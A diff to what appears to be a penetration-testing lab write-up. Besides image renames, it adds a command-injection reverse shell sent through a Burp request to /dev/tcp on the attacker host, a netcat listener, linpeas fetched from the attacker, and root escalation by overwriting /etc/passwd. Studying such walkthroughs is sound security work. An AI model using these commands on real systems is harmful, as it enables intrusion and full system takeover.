@@ -67,7 +67,7 @@ dirb http://$WEB:80 /usr/share/wordlists/dirb/big.txt -X .php
 
 <figure><img src="../../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (37) (3).png" alt=""><figcaption></figcaption></figure>
 
 Manually looking around there is a meet the team page, when clicking on the images we can see the folder holding all their pictures with their names, potentially could be usernames.
 
@@ -104,7 +104,7 @@ theme-preview
 
 [http://10.200.119.13/october/index.php/backend/backend/auth/signin](http://10.200.119.13/october/index.php/backend/backend/auth/signin)
 
-<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (47) (3).png" alt=""><figcaption></figcaption></figure>
 
 
 
@@ -335,7 +335,7 @@ OpenVPN port potentially found
 <pre><code><strong>nmap -sV -sT -O -p 1-65535 $VPN 
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (2).png" alt=""><figcaption></figcaption></figure>
 
 ### VPN - HTTP port 80
 
@@ -399,6 +399,109 @@ nmap -sP 12.100.1.1-255
 
 <figure><img src="../../.gitbook/assets/image (85) (2).png" alt=""><figcaption></figcaption></figure>
 
+### Reverse shell
+
+**Kali**
+
+```
+nc -lvnp 1337
+```
+
+**Burp Request**
+
+```
+GET /requestvpn.php?filename=hack+%26%26+bash+-i+>%26+/dev/tcp/$Kali/1337+0>%261 HTTP/1.1
+Host: 10.200.119.12
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: close
+Referer: http://10.200.119.12/vpncontrol.php
+Cookie: PHPSESSID=ra6pkkf1ei3v7gq52pcvpk1b95
+Upgrade-Insecure-Requests: 1
+
+
+```
+
+**Victim**
+
+```
+python -c 'import pty; pty.spawn("/bin/bash")'
+ctrl + Z
+stty raw -echo;fg
+```
+
+<figure><img src="../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
+
+#### LinPeas
+
+**Kali**
+
+```
+wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+python2 -m SimpleHTTPServer 81
+```
+
+**Victim**
+
+```
+cd /tmp/
+wget http://$KALI:81/linpeas.sh
+chmod +x linpeas.sh 
+./linpeas.sh
+```
+
+
+
+<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src="../../.gitbook/assets/image (47).png" alt=""><figcaption></figcaption></figure>
+
+### Privlege Escalation
+
+**Kali**
+
+```
+openssl passwd -1 -salt new 123
+echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> passwd
+python2 -m SimpleHTTPServer 81
+```
+
+**Victim**
+
+```
+cd /tmp/
+wget http://$KALI:81/passwd
+sudo cp passwd /etc/passwd
+```
+
+**Victim**
+
+```
+su new
+Password: 123
+```
+
+<figure><img src="../../.gitbook/assets/image (37).png" alt=""><figcaption></figcaption></figure>
+
+**Victim**
+
+```
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
 12.100.1.10
 
 ## WebMail- Scanning&#x20;
@@ -457,7 +560,7 @@ remmina
 Domain: corp.thereserve.loc
 </code></pre>
 
-<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (51) (4).png" alt=""><figcaption></figcaption></figure>
 
 **Remmina**
 
